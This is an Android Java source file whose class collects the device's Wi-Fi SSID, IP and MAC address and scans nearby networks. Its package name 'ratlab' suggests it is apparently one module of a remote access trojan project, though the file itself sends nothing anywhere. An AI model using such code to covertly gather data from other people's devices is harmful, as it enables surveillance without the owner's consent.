package com.ratlab;
import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import java.util.List;
public class NetworkInfo {
    public static String getWifi(Context ctx) {
        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wi = wm.getConnectionInfo();
            return "SSID: " + wi.getSSID() + "\nIP: " + wi.getIpAddress() + "\nMAC: " + wi.getMacAddress();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }
    public static String scanWifi(Context ctx) {
        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            List<android.net.wifi.ScanResult> list = wm.getScanResults();
            StringBuilder sb = new StringBuilder();
            for (android.net.wifi.ScanResult r : list) {
                sb.append(r.SSID).append(" (").append(r.level).append(" dBm)\n");
                if (sb.length() > 3500) break;
            }
            return sb.length() == 0 ? "Kosong" : sb.toString();
        } catch (Exception e) { return "Error: " + e.getMessage(); }
    }
}
